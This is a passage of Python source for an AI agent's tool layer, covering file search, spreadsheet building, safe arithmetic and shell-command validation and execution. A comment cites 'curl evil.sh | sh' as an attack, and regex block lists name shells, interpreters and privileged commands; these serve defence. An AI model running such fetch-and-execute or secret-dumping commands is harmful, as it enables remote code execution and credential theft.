                    "status": "failed" if failures else "passed",
                    "checks": checks,
                }
            )

        overall = (
            "failed"
            if any(row.get("status") == "failed" for row in file_results)
            else "passed"
        )
        payload: Dict[str, Any] = {"status": overall, "files": file_results}
        diagnostics_requested = include_diagnostics is True or (
            isinstance(include_diagnostics, str)
            and include_diagnostics.strip().lower() in {"1", "true", "yes"}
        )
        if diagnostics_requested:
            diagnostics_raw = await self.diagnose_files(paths, provider=provider)
            try:
                diagnostics = json.loads(diagnostics_raw)
            except (TypeError, json.JSONDecodeError):
                diagnostics = {
                    "status": "failed",
                    "detail": diagnostics_raw,
                }
            payload["diagnostics"] = diagnostics
            if diagnostics.get("status") == "failed":
                payload["status"] = "failed"
        return json.dumps(payload, ensure_ascii=False)

    async def diagnose_files(
        self,
        paths: List[str],
        provider: str = "auto",
        timeout: float = 45,
    ) -> str:
        """Use an installed linter/type checker when available.

        This is optional by design.  Missing Ruff, Pyright, ESLint, or
        TypeScript tooling returns ``skipped`` rather than making LimeBot's
        core verification path unavailable.
        """
        if not isinstance(paths, list) or not paths:
            return "Error: diagnose_files requires a non-empty paths array."
        if len(paths) > 32:
            return "Error: diagnose_files accepts at most 32 paths."

        targets: List[Path] = []
        invalid_paths: List[Dict[str, str]] = []
        for raw_path in paths:
            display_input = str(raw_path or "")
            if not self._is_path_allowed(display_input):
                invalid_paths.append(
                    {"path": display_input, "detail": "access denied"}
                )
                continue
            target = self._resolve_tool_path(display_input)
            if not target.exists() or not target.is_file():
                invalid_paths.append(
                    {
                        "path": self._to_display_path(target),
                        "detail": "file does not exist or is not a regular file",
                    }
                )
                continue
            targets.append(target)

        if not targets:
            return json.dumps(
                {
                    "status": "failed",
                    "provider": str(provider or "auto"),
                    "results": [],
                    "invalid_paths": invalid_paths,
                },
                ensure_ascii=False,
            )

        try:
            timeout_value = max(1.0, min(float(timeout), 120.0))
        except (TypeError, ValueError):
            timeout_value = 45.0

        try:
            from core.diagnostics import run_optional_diagnostics

            payload = await run_optional_diagnostics(
                targets,
                self._active_tool_root(),
                provider=provider,
                env=self._sanitized_env(),
                timeout=timeout_value,
            )
        except Exception as exc:
            logger.warning(f"Optional diagnostics failed to start: {exc}")
            payload = {
                "status": "failed",
                "provider": str(provider or "auto"),
                "results": [],
                "detail": str(exc),
            }

        payload["paths"] = [self._to_display_path(target) for target in targets]
        if invalid_paths:
            payload["invalid_paths"] = invalid_paths
            payload["status"] = "failed"
        for result in payload.get("results", []):
            for key in ("detail", "output"):
                if key in result:
                    result[key] = redact_sensitive_text(str(result[key])[:8_000])
        return json.dumps(payload, ensure_ascii=False)

    async def calculate(self, expression: str) -> str:
        """Evaluate bounded arithmetic without invoking a shell or interpreter."""
        expression = str(expression or "").strip()
        if not expression:
            return "Error: An arithmetic expression is required."
        if len(expression) > 500:
            return "Error: Expression is too long (maximum 500 characters)."

        binary_ops = {
            ast.Add: lambda a, b: a + b,
            ast.Sub: lambda a, b: a - b,
            ast.Mult: lambda a, b: a * b,
            ast.Div: lambda a, b: a / b,
            ast.FloorDiv: lambda a, b: a // b,
            ast.Mod: lambda a, b: a % b,
            ast.Pow: lambda a, b: a**int(b),
        }
        unary_ops = {ast.UAdd: lambda value: value, ast.USub: lambda value: -value}

        def evaluate(node: ast.AST, depth: int = 0) -> Decimal:
            if depth > 30:
                raise ValueError("expression nesting is too deep")
            if isinstance(node, ast.Expression):
                return evaluate(node.body, depth + 1)
            if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
                return Decimal(str(node.value))
            if isinstance(node, ast.UnaryOp) and type(node.op) in unary_ops:
                return unary_ops[type(node.op)](evaluate(node.operand, depth + 1))
            if isinstance(node, ast.BinOp) and type(node.op) in binary_ops:
                left = evaluate(node.left, depth + 1)
                right = evaluate(node.right, depth + 1)
                if isinstance(node.op, ast.Pow):
                    if right != right.to_integral_value() or abs(right) > 20:
                        raise ValueError("power must be an integer between -20 and 20")
                value = binary_ops[type(node.op)](left, right)
                if abs(value) > Decimal("1e100"):
                    raise ValueError("result magnitude is too large")
                return value
            raise ValueError(f"unsupported expression element: {type(node).__name__}")

        try:
            parsed = ast.parse(expression, mode="eval")
            with localcontext() as context:
                context.prec = 28
                value = evaluate(parsed)
        except (SyntaxError, ValueError, InvalidOperation, DivisionByZero, ZeroDivisionError) as exc:
            return f"Error: Invalid arithmetic expression ({exc})."

        rendered = format(value, "f")
        if "." in rendered:
            rendered = rendered.rstrip("0").rstrip(".")
        if rendered in {"", "-0"}:
            rendered = "0"
        return f"Result: {rendered}"

    async def create_spreadsheet(
        self,
        path: str,
        sheets: List[Dict[str, Any]],
        title: str = "",
    ) -> str:
        """Create a styled, formula-capable XLSX workbook as a native tool."""
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        target = self._resolve_tool_path(path, for_write=True)
        if target.suffix.lower() != ".xlsx":
            return "Error: create_spreadsheet requires a path ending in .xlsx."
        if self._is_persona_managed_path(target):
            return "Error: Direct modification of state-managed files under 'persona/' is blocked."

        if not isinstance(sheets, list) or not sheets:
            return "Error: At least one worksheet is required."
        if len(sheets) > 20:
            return "Error: A workbook may contain at most 20 worksheets."

        total_cells = 0
        normalized_sheets: List[tuple[str, List[List[Any]]]] = []
        used_names: set[str] = set()
        for index, sheet in enumerate(sheets, start=1):
            if not isinstance(sheet, dict):
                return f"Error: Worksheet {index} must be an object."
            raw_name = str(sheet.get("name") or f"Sheet{index}")
            name = re.sub(r"[\\/*?:\[\]]", "-", raw_name).strip(" '")[:31]
            name = name or f"Sheet{index}"
            base_name = name
            suffix = 2
            while name.lower() in used_names:
                marker = f"-{suffix}"
                name = f"{base_name[: 31 - len(marker)]}{marker}"
                suffix += 1
            used_names.add(name.lower())

            rows = sheet.get("rows")
            if not isinstance(rows, list) or not rows:
                return f"Error: Worksheet '{name}' must include at least one row."
            if len(rows) > 2000:
                return f"Error: Worksheet '{name}' exceeds the 2,000-row limit."
            normalized_rows: List[List[Any]] = []
            for row_number, row in enumerate(rows, start=1):
                if not isinstance(row, list):
                    return f"Error: Row {row_number} in worksheet '{name}' must be an array."
                if len(row) > 50:
                    return f"Error: Row {row_number} in worksheet '{name}' exceeds 50 columns."
                normalized_rows.append(row)
                total_cells += len(row)
                if total_cells > 20_000:
                    return "Error: Workbook exceeds the 20,000-cell safety limit."
            normalized_sheets.append((name, normalized_rows))

        def build_workbook() -> tuple[int, int]:
            try:
                from openpyxl import Workbook
                from openpyxl.styles import Alignment, Font, PatternFill
                from openpyxl.utils import get_column_letter
            except ImportError as exc:
                raise RuntimeError(
                    "Spreadsheet support is unavailable because openpyxl is not installed."
                ) from exc

            workbook = Workbook()
            workbook.remove(workbook.active)
            workbook.calculation.fullCalcOnLoad = True
            workbook.calculation.forceFullCalc = True
            workbook.calculation.calcMode = "auto"
            if title:
                workbook.properties.title = str(title)[:255]
            header_fill = PatternFill("solid", fgColor="1F4E78")
            header_font = Font(color="FFFFFF", bold=True)
            band_fill = PatternFill("solid", fgColor="DDEBF7")
            formulas = 0

            for sheet_name, rows in normalized_sheets:
                worksheet = workbook.create_sheet(sheet_name)
                for row_index, row in enumerate(rows, start=1):
                    for column_index, value in enumerate(row, start=1):
                        cell = worksheet.cell(row=row_index, column=column_index, value=value)
                        cell.alignment = Alignment(vertical="top", wrap_text=True)
                        if isinstance(value, str) and value.startswith("="):
                            formulas += 1
                        if isinstance(value, str) and value.startswith(("https://", "http://")):
                            cell.hyperlink = value
                            cell.style = "Hyperlink"
                    if row_index > 1 and row_index % 2 == 0:
                        for cell in worksheet[row_index]:
                            if cell.fill.fill_type is None:
                                cell.fill = band_fill

                for cell in worksheet[1]:
                    cell.fill = header_fill
                    cell.font = header_font
                    cell.alignment = Alignment(vertical="center", wrap_text=True)

                if len(rows) > 1:
                    worksheet.freeze_panes = "A2"
                    worksheet.auto_filter.ref = worksheet.dimensions

                headers = [str(value or "").strip().lower() for value in rows[0]]
                for column_index in range(1, worksheet.max_column + 1):
                    header = headers[column_index - 1] if column_index <= len(headers) else ""
                    values = [worksheet.cell(row=r, column=column_index).value for r in range(1, worksheet.max_row + 1)]
                    width = min(60, max(10, max((len(str(v)) for v in values if v is not None), default=8) + 2))
                    worksheet.column_dimensions[get_column_letter(column_index)].width = width
                    if any(token in header for token in ("usd", "cost", "price", "monthly", "annual", "total")):
                        for row_index in range(2, worksheet.max_row + 1):
                            worksheet.cell(row=row_index, column=column_index).number_format = '$#,##0.00'
                    elif "percent" in header or "%" in header:
                        for row_index in range(2, worksheet.max_row + 1):
                            worksheet.cell(row=row_index, column=column_index).number_format = "0.00%"

            target.parent.mkdir(parents=True, exist_ok=True)
            temporary = target.with_name(f".{target.stem}.{uuid.uuid4().hex}.tmp.xlsx")
            try:
                workbook.save(temporary)
                os.replace(temporary, target)
            finally:
                if temporary.exists():
                    temporary.unlink(missing_ok=True)
            return len(normalized_sheets), formulas

        try:
            sheet_count, formula_count = await asyncio.to_thread(build_workbook)
            return (
                f"Successfully created spreadsheet '{path}' with {sheet_count} worksheet(s), "
                f"{total_cells} cells, and {formula_count} formula(s). Use send_media to deliver it."
            )
        except Exception as exc:
            return f"Error creating spreadsheet: {exc}"

    async def delete_file(self, path: str) -> str:
        """Delete a file or directory."""
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        p = self._resolve_tool_path(path, for_write=True)
        if self._is_persona_managed_path(p):
            return (
                "Error: Direct deletion of state-managed files under 'persona/' is blocked. "
                "Please use the appropriate XML tags to manage your state."
            )

        if not p.exists():
            return f"Error: Path '{path}' does not exist."
        try:
            if p.is_file():
                await asyncio.to_thread(p.unlink)
            elif p.is_dir():
                await asyncio.to_thread(shutil.rmtree, p)
            return f"Successfully deleted '{path}'."
        except Exception as e:
            return f"Error deleting: {e}"

    async def list_dir(
        self,
        path: str = ".",
        limit: int = 200,
        offset: int = 0,
        include_hidden: bool = False,
        sort_by: str = "name",
        descending: bool = False,
        folders_first: bool = True,
    ) -> str:
        """
        List files in a directory with pagination and configurable sorting.
        Uses os.scandir/os.walk-style traversal semantics for lower overhead.
        """
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        p = self._resolve_tool_path(path)
        if not p.exists():
            return f"Error: Directory '{path}' does not exist."
        if not p.is_dir():
            return f"Error: Path '{path}' is not a directory."
        try:
            try:
                limit = int(limit)
            except Exception:
                limit = 200
            limit = max(1, min(limit, 1000))

            try:
                offset = int(offset)
            except Exception:
                offset = 0
            offset = max(0, offset)

            sort_by = (sort_by or "name").strip().lower()
            if sort_by not in {"name", "type", "mtime", "size", "none"}:
                return "Error: sort_by must be one of: name, type, mtime, size, none."

            def _scan_dir() -> List[Dict[str, Any]]:
                entries: List[Dict[str, Any]] = []
                with os.scandir(p) as it:
                    for entry in it:
                        name = entry.name
                        if not include_hidden and name.startswith("."):
                            continue

                        try:
                            is_dir = entry.is_dir(follow_symlinks=False)
                        except Exception:
                            is_dir = False

                        rec: Dict[str, Any] = {"name": name, "is_dir": is_dir}

                        if sort_by in {"mtime", "size"}:
                            try:
                                st = entry.stat(follow_symlinks=False)
                                rec["mtime"] = st.st_mtime
                                rec["size"] = 0 if is_dir else st.st_size
                            except Exception:
                                rec["mtime"] = 0
                                rec["size"] = 0

                        entries.append(rec)
                return entries

            entries = await asyncio.to_thread(_scan_dir)

            def _key_for(rec: Dict[str, Any]):
                if sort_by == "mtime":
                    return rec.get("mtime", 0)
                if sort_by == "size":
                    return rec.get("size", 0)
                return rec["name"].lower()

            if sort_by == "type":
                entries.sort(
                    key=lambda r: (0 if r["is_dir"] else 1, r["name"].lower()),
                    reverse=descending,
                )
            elif sort_by != "none":
                if folders_first:
                    dirs = [r for r in entries if r["is_dir"]]
                    files = [r for r in entries if not r["is_dir"]]
                    dirs.sort(key=_key_for, reverse=descending)
                    files.sort(key=_key_for, reverse=descending)
                    entries = dirs + files
                else:
                    entries.sort(key=_key_for, reverse=descending)
            elif folders_first:
                dirs = [r for r in entries if r["is_dir"]]
                files = [r for r in entries if not r["is_dir"]]
                entries = dirs + files

            total = len(entries)
            page = entries[offset : offset + limit]

            if not page:
                return f"No entries in page (offset={offset}, total={total})."

            start = offset + 1
            end = offset + len(page)
            header = f"Listing '{self._to_display_path(p)}' ({start}-{end} of {total})"
            if end < total:
                header += f" — more entries available (next offset: {end})"

            lines = [header]
            for rec in page:
                type_str = "DIR" if rec["is_dir"] else "FILE"
                lines.append(f"[{type_str}] {rec['name']}")

            return "\n".join(lines)
        except Exception as e:
            return f"Error listing directory: {e}"

    async def search_files(
        self,
        query: str,
        path: str = ".",
        file_glob: str = "*",
        mode: str = "content",
        case_sensitive: bool = False,
        max_results: int = 40,
    ) -> str:
        """
        Fast project search for file names or file content.
        Uses ripgrep when available, with a safe Python fallback.
        """
        query = (query or "").strip()
        if not query:
            return "Error: 'query' is required."
        if len(query) > 256:
            return "Error: query is too long (max 256 chars)."

        mode = (mode or "content").strip().lower()
        if mode not in {"content", "name"}:
            return "Error: mode must be either 'content' or 'name'."

        try:
            max_results = max(1, min(int(max_results), 200))
        except Exception:
            max_results = 40

        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."

        root = self._resolve_tool_path(path)
        if not root.exists():
            return f"Error: Path '{path}' does not exist."

        try:
            if mode == "name":
                rows = await asyncio.to_thread(
                    self._search_file_names_sync,
                    root,
                    query,
                    file_glob,
                    case_sensitive,
                    max_results,
                )
            else:
                rows = await asyncio.to_thread(
                    self._search_file_content_sync,
                    root,
                    query,
                    file_glob,
                    case_sensitive,
                    max_results,
                )
            return self._format_search_results(rows, query)
        except Exception as e:
            return f"Error searching files: {e}"

    def _search_file_names_sync(
        self,
        root: Path,
        query: str,
        file_glob: str,
        case_sensitive: bool,
        max_results: int,
    ) -> List[Dict[str, Any]]:
        """Sync helper for filename search."""
        if not root.is_dir():
            if root.is_file() and self._is_path_allowed(root):
                name = root.name
                hit = query in name if case_sensitive else query.lower() in name.lower()
                if hit:
                    return [
                        {"path": self._to_display_path(root), "line": None, "text": ""}
                    ]
            return []

        q = query if case_sensitive else query.lower()
        rows: List[Dict[str, Any]] = []

        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [
                d
                for d in dirnames
                if d
                not in {
                    ".git",
                    "node_modules",
                    "__pycache__",
                    ".venv",
                    "venv",
                    "env",
                    ".mypy_cache",
                    ".vercel",
                    ".next",
                    ".idea",
                    ".vscode",
                }
            ]
            for filename in filenames:
                if len(rows) >= max_results:
                    break
                file_path = Path(dirpath) / filename
                if file_glob and file_glob != "*" and not file_path.match(file_glob):
                    continue
                if not self._is_path_allowed(file_path):
                    continue
                hay = filename if case_sensitive else filename.lower()
                if q in hay:
                    rows.append(
                        {
                            "path": self._to_display_path(file_path),
                            "line": None,
                            "text": "",
                        }
                    )
            if len(rows) >= max_results:
                break
        return rows

    def _search_file_content_sync(
        self,
        root: Path,
        query: str,
        file_glob: str,
        case_sensitive: bool,
        max_results: int,
    ) -> List[Dict[str, Any]]:
        """Sync helper for content search; prefers ripgrep for speed."""
        rg_bin = shutil.which("rg")
        if rg_bin:
            try:
                import subprocess

                cmd = [
                    rg_bin,
                    "--json",
                    "--line-number",
                    "--color",
                    "never",
                    "--max-count",
                    "3",
                ]
                if not case_sensitive:
                    cmd.append("-i")
                if file_glob and file_glob != "*":
                    cmd.extend(["-g", file_glob])
                for g in _RG_EXCLUDE_GLOBS:
                    cmd.extend(["-g", g])
                cmd.extend(["--", query, str(root)])

                completed = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                    timeout=20,
                )

                # ripgrep exit codes: 0=matches, 1=no matches, >1 error
                if completed.returncode not in (0, 1):
                    raise RuntimeError(completed.stderr.strip() or "ripgrep failed")

                rows: List[Dict[str, Any]] = []
                for line in completed.stdout.splitlines():
                    if len(rows) >= max_results:
                        break
                    try:
                        payload = json.loads(line)
                    except Exception:
                        continue
                    if payload.get("type") != "match":
                        continue
                    data = payload.get("data", {})
                    path_text = (
                        data.get("path", {}).get("text")
                        or data.get("path", {}).get("bytes")
                        or ""
                    )
                    if not path_text:
                        continue
                    file_path = self._resolve_tool_path(path_text)
                    if not self._is_path_allowed(file_path):
                        continue

                    row_text = (data.get("lines", {}).get("text") or "").rstrip("\n")
                    rows.append(
                        {
                            "path": self._to_display_path(file_path),
                            "line": data.get("line_number"),
                            "text": row_text,
                        }
                    )
                return rows
            except Exception as e:
                logger.debug(f"search_files ripgrep path failed; falling back: {e}")

        # Fallback: Python scan
        rows: List[Dict[str, Any]] = []
        q = query if case_sensitive else query.lower()

        if root.is_file():
            candidates = [root]
        else:
            candidates = []
            for dirpath, dirnames, filenames in os.walk(root):
                dirnames[:] = [
                    d
                    for d in dirnames
                    if d
                    not in {
                        ".git",
                        "node_modules",
                        "__pycache__",
                        ".venv",
                        "venv",
                        "env",
                        ".mypy_cache",
                        ".vercel",
                        ".next",
                        ".idea",
                        ".vscode",
                    }
                ]
                for filename in filenames:
                    p = Path(dirpath) / filename
                    if file_glob and file_glob != "*" and not p.match(file_glob):
                        continue
                    candidates.append(p)

        for file_path in candidates:
            if len(rows) >= max_results:
                break
            try:
                if not file_path.is_file() or not self._is_path_allowed(file_path):
                    continue

                # Skip files larger than 5MB to prevent stalling
                try:
                    if file_path.stat().st_size > 5_000_000:
                        continue
                except Exception:
                    pass

                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    for idx, line in enumerate(f, start=1):
                        hay = line if case_sensitive else line.lower()
                        if q in hay:
                            rows.append(
                                {
                                    "path": self._to_display_path(file_path),
                                    "line": idx,
                                    "text": line.rstrip("\n"),
                                }
                            )
                            break
                        if len(rows) >= max_results:
                            break
            except Exception:
                continue
        return rows

    @staticmethod
    def _sanitized_env() -> dict:
        """Return a copy of the process environment with secrets stripped.

        ``config.py`` injects provider credentials into ``os.environ`` for
        legitimate in-process consumers (LiteLLM, vector embeddings, browser
        tooling). Subprocesses spawned by ``run_command`` inherit the full
        environment by default, so an approved-by-mistake ``env``/``printenv``
        would exfiltrate every key. Drop anything that looks like a secret
        while preserving PATH/HOME/TMPDIR and other benign vars.
        """
        secret_suffixes = ("API_KEY", "_TOKEN", "_SECRET", "PASSWORD", "APIKEY")
        sanitized = {}
        for key, value in os.environ.items():
            upper = key.upper()
            if any(upper.endswith(suffix) for suffix in secret_suffixes):
                continue
            sanitized[key] = value
        return sanitized

    def validate_command(self, command: str) -> Optional[str]:
        """Return a deterministic validation error before approval/execution."""
        command = str(command or "").strip()
        if not command:
            return "Error: Command is required."
        workspace_root, source_root = self._active_workspace_paths()
        isolated = workspace_root is not None and source_root is not None
        # Isolated clones may chain/redirect because writes stay in the copy.
        # Live chat still blocks && || redirects. Bare `|` is allowed on both
        # paths except when piped into an interpreter.
        if isolated:
            forbidden_regex = r"(\$\(|\`|\n)"
        else:
            forbidden_regex = r"(\$\(|\`|&&|\|\||>|<|\n)"
        pseudo_call_match = re.match(
            r"^\s*([A-Za-z_][\w\.]*)\s*\((.*)\)\s*$", str(command or ""), re.DOTALL
        )

        unsafe_allowed = bool(
            getattr(self.config, "allow_unsafe_commands", False)
        ) if self.config else False

        if not unsafe_allowed and not isolated and re.search(
            r"^\s*cd\s+/d\s+.+&&", command, re.IGNORECASE
        ):
            return (
                "Error: Chained shell commands are blocked. LimeBot already runs "
                "commands from the project directory; run only the intended command "
                "(for example, python skills/docx-creator/scripts/create_docx.py)."
            )

        long_running_hint = self._long_running_command_hint(command)
        if long_running_hint:
            return long_running_hint

        if isolated:
            normalized_command = os.path.normcase(command).replace("/", "\\")
            normalized_source_root = os.path.normcase(str(source_root)).replace(
                "/", "\\"
            ).rstrip("\\")
            source_path_spellings = {normalized_source_root}
            try:
                relative_source = source_root.relative_to(Path.cwd().resolve())
                source_path_spellings.add(
                    os.path.normcase(str(relative_source)).replace("/", "\\")
                )
            except ValueError:
                pass
            if any(
                spelling and spelling in normalized_command
                for spelling in source_path_spellings
            ):
                return (
                    "Error: Isolated sub-agent commands cannot address the live project "
                    "by absolute path. Use paths relative to the temporary workspace."
                )
            if re.search(r"(^|[\s\"'])\.\.(?:[\\/]|$)", command):
                return (
                    "Error: Isolated sub-agent commands cannot escape the temporary "
                    "workspace with parent-directory paths."
                )

        if pseudo_call_match:
            call_name = pseudo_call_match.group(1)
            return (
                f"Error: '{call_name}(...)' looks like a pseudo tool or skill-manual example, "
                "not a shell command. SKILL.md examples are documentation only. "
                "Use an explicit CLI command with run_command instead, such as "
                "`python skills/<skill>/main.py ...`."
            )

        if not unsafe_allowed and re.search(forbidden_regex, command):
            match = re.search(forbidden_regex, command).group(0)
            if isolated:
                return (
                    f"Error: Isolated-workspace command contains forbidden "
                    f"character/sequence '{match}'. Backticks, $(), and newlines "
                    "stay blocked even inside a copy."
                )
            return (
                f"Error: Command contains forbidden character/sequence '{match}'. "
                "Live chat blocks &&, ||, redirects, backticks, $(), and newlines. "
                "Use run_steps for a sequential unittest then py_compile chain, or "
                "spawn_agent(isolation='copy') if you need shell chaining inside a "
                "clone. Enable 'Allow Unsafe Commands' in Config to bypass this "
                "restriction."
            )

        if not unsafe_allowed and self._has_unquoted_semicolon(command):
            return "Error: Command contains forbidden character/sequence ';'. Enable 'Allow Unsafe Commands' in Config to bypass this restriction."

        # The forbidden_regex intentionally permits a bare pipe `|` so legitimate
        # flows like `... | grep` / `... | head` keep working. That same pipe,
        # however, enables `curl evil.sh | sh`, turning a fetched payload into
        # arbitrary code execution. Block piping into interpreters/executors
        # specifically while leaving text filters untouched.
        if not unsafe_allowed and re.search(
            r"\|\s*(sh|bash|zsh|dash|ksh|fish|python[0-9.]*|perl|ruby|node|xargs)\b",
            command,
        ):
            return (
                "Error: Piping command output directly into an interpreter "
                "(e.g. '| sh', '| bash', '| python') is blocked to prevent "
                "remote code execution. Download and inspect the script first, "
                "or enable 'Allow Unsafe Commands' in Config."
            )

        lowered_command = command.lower()
        if "pythonpath=" in lowered_command:
            return (
                "Error: Environment assignment 'PYTHONPATH=' is blocked by LimeBot "
                "command policy (validate_command). This is a host policy check, "
                "not an OS or runtime environment rejection. Remove the assignment "
                "from the command; do not claim the environment blocked it."
            )
        if "ifs=" in lowered_command:
            return (
                "Error: Environment assignment 'IFS=' is blocked by LimeBot "
                "command policy (validate_command). This is a host policy check, "
                "not an OS or runtime environment rejection. Remove the assignment "
                "from the command; do not claim the environment blocked it."
            )

        if not unsafe_allowed and any(
            f in lowered_command for f in ["sudo", "chmod", "chown"]
        ):
            return (
                "Error: Privileged commands are blocked. "
                "Enable 'Allow Unsafe Commands' in Config to allow them."
            )

        return None

    async def run_command(self, command: str) -> str:
        """Execute a terminal command with real-time progress updates."""
        command = str(command or "").strip()
        validation_error = self.validate_command(command)
        if validation_error:
            return validation_error

        try:
            command, browser_launch_error = self._normalize_browser_launch_command(command)
            if browser_launch_error:
                return browser_launch_error

            # Rewrite bare pip/python commands to use the running interpreter
            # so packages always install into the correct venv.
            _this_python = self._preferred_python_executable()
            _rewrites = [
                ("pip install ", f'"{_this_python}" -m pip install '),
                ("pip3 install ", f'"{_this_python}" -m pip install '),
                ("pip uninstall ", f'"{_this_python}" -m pip uninstall '),
                ("pip3 uninstall ", f'"{_this_python}" -m pip uninstall '),
                ("python3 ", f'"{_this_python}" '),
                ("python ", f'"{_this_python}" '),
            ]
            for _old, _new in _rewrites:
                if command.startswith(_old) or command.startswith(_old.capitalize()):
                    command = _new + command[len(_old) :]
                    break

            await self.send_progress(f"💻 Running: {command}")

            import os
            import time as _time

            if self._is_browser_remote_debug_launch(command):
                port = self._extract_remote_debug_port(command) or 9222
                creationflags = 0
                if os.name == "nt":
                    creationflags = (
                        subprocess.DETACHED_PROCESS
                        | subprocess.CREATE_NEW_PROCESS_GROUP
                    )

                subprocess.Popen(
                    command,
                    shell=True,
                    cwd=str(self._active_tool_root()),
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=creationflags,
                    close_fds=True,
                    env=self._sanitized_env(),
                )

                deadline = _time.monotonic() + 10
                while _time.monotonic() < deadline:
                    if self._is_local_port_in_use(port):
                        return (
                            f"Success: Browser launched for CDP attach on "
                            f"http://127.0.0.1:{port}"
                        )
                    await asyncio.sleep(0.25)

                return (
                    f"Error: Browser launch command was started, but CDP port {port} "
                    "did not become available within 10 seconds."
                )

            kwargs = {
                "stdin": asyncio.subprocess.DEVNULL,
                "stdout": asyncio.subprocess.PIPE,
                "stderr": asyncio.subprocess.PIPE,
                "cwd": str(self._active_tool_root()),
                "env": self._sanitized_env(),
            }
            if os.name == "nt":
                kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW

            process = await asyncio.create_subprocess_shell(command, **kwargs)

            full_output = []
            last_activity = _time.monotonic()
            stall_detected = False
            STALL_TIMEOUT = 0
            if self.config:
                try:
                    STALL_TIMEOUT = float(getattr(self.config, "stall_timeout", 0))
                except (ValueError, TypeError):
                    pass

            # Bypass stall watchdog for installation/download/update commands
            is_install_cmd = any(
                keyword in command.lower()
                for keyword in ("install", "download", "setup", "update", "upgrade", "clone", "pull")
            )
            if is_install_cmd:
                STALL_TIMEOUT = None

            if STALL_TIMEOUT is not None and STALL_TIMEOUT <= 0:
                STALL_TIMEOUT = None

            last_progress = _time.monotonic()

            async def read_stream(stream, name):
                nonlocal last_activity, last_progress
                async for line in stream:
                    last_activity = _time.monotonic()
                    line_text = line.decode("utf-8", errors="replace").strip()
                    if line_text:
                        if len(line_text) > 1000:
                            line_text = line_text[:1000] + "... [Line too long]"

                        now = _time.monotonic()
                        if now - last_progress >= 0.02:
                            await self.send_progress(f"[{name}] {line_text}")
                            last_progress = now
                        full_output.append(line_text)

            async def _force_kill(proc):
                """Force-kill a process tree (Windows-safe)."""
                import os as _os

                try:
                    if _os.name == "nt":
                        import subprocess as _sp

                        await asyncio.to_thread(
                            _sp.call,
                            ["taskkill", "/F", "/T", "/PID", str(proc.pid)],
                            stdout=_sp.DEVNULL,
                            stderr=_sp.DEVNULL,
                        )
                    proc.kill()
                except Exception:
                    pass
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except Exception:
                    pass

            def _diagnose_stall(cmd):
                """Return a diagnostic hint based on the command that stalled."""
                cl = cmd.lower()
                if "gh " in cl:
                    return (
                        "The GitHub CLI (gh) likely needs authentication. "
                        "Run 'gh auth login' in a terminal first, or the "
                        "command may need '--json' to avoid paging."
                    )
                if "git push" in cl or "git pull" in cl or "git clone" in cl:
                    return (
                        "Git is likely waiting for credentials. Ensure "
                        "SSH keys or a credential helper are configured."
                    )
                if "npm " in cl:
                    return "npm may be prompting for input. Try adding '--yes' or '-y'."
                if "pip " in cl:
                    return "pip may be prompting. Try adding '--no-input' or '-y'."
                if "ssh " in cl or "scp " in cl:
                    return "SSH is likely waiting for a password or key passphrase."
                return (
                    "The command produced no output and is likely waiting "
                    "for interactive input. Retry with non-interactive flags "
                    "(e.g. --yes, --confirm, -y, --no-input)."
                )

            async def stall_watchdog():
                nonlocal stall_detected
                if not STALL_TIMEOUT:
                    return
                while process.returncode is None:
                    await asyncio.sleep(min(1.0, max(0.1, STALL_TIMEOUT / 4)))
                    idle = _time.monotonic() - last_activity
                    if idle >= STALL_TIMEOUT:
                        stall_detected = True
                        logger.warning(
                            f"Stall detected ({STALL_TIMEOUT}s no output): "
                            f"{redact_sensitive_text(command)}"
                        )
                        await self.send_progress(
                            f"⚠️ Command stalled — no output for {STALL_TIMEOUT}s. "
                            "Killing process."
                        )
                        await _force_kill(process)
                        return

            timeout_val = 0
            if self.config:
                if hasattr(self.config, "command_timeout"):
                    try:
                        timeout_val = float(getattr(self.config, "command_timeout"))
                    except (ValueError, TypeError):
                        pass
                elif isinstance(self.config, dict) and "command_timeout" in self.config:
                    try:
                        timeout_val = float(self.config.get("command_timeout", 0))
                    except (ValueError, TypeError):
                        pass

            # Installation/download/update commands may exceed the configured
            # one-shot timeout, but still receive the hard safety cap below.
            if is_install_cmd:
                timeout_val = None

            if timeout_val is None or timeout_val <= 0:
                try:
                    timeout_val = float(
                        getattr(
                            self.config,
                            "run_command_max_seconds",
                            _DEFAULT_RUN_COMMAND_MAX_SECONDS,
                        )
                    )
                except (AttributeError, TypeError, ValueError):
                    timeout_val = _DEFAULT_RUN_COMMAND_MAX_SECONDS
                if timeout_val <= 0:
                    timeout_val = _DEFAULT_RUN_COMMAND_MAX_SECONDS

            try:
                await asyncio.wait_for(
                    asyncio.gather(
                        read_stream(process.stdout, "STDOUT"),
                        read_stream(process.stderr, "STDERR"),
                        stall_watchdog(),
                    ),
                    timeout=timeout_val,
                )
            except asyncio.TimeoutError:
                logger.warning(
                    f"Command timed out after {timeout_val}s: "
                    f"{redact_sensitive_text(command)}"
                )
                await _force_kill(process)
                full_output.append(
                    f"[TIMEOUT] Command was terminated after {timeout_val} seconds."
                )
            except asyncio.CancelledError:
                logger.warning(
                    "Command execution cancelled by user: "
                    f"{redact_sensitive_text(command)}"
                )
                await _force_kill(process)
                raise

            if not stall_detected:
                await process.wait()

            output = "\n".join(full_output)

            output = re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", output)

            if stall_detected:
                diagnosis = _diagnose_stall(command)
                output += (
                    f"\n\n[STALL] Command killed after {STALL_TIMEOUT}s of silence.\n"
                    f"Diagnosis: {diagnosis}"
                )

            exit_code = process.returncode
            if not output:
                output = f"Success (Exit Code: {exit_code}, No output)"
            else:
                output += f"\n\nExit Code: {exit_code}"

            if exit_code not in (0, None):
                output = f"Error: Command failed with exit code {exit_code}.\n{output}"

            try:
                skill_info = self._detect_skill_path(command)
                if skill_info and process.returncode not in (0, None):
                    from core.skill_installer import SkillInstaller

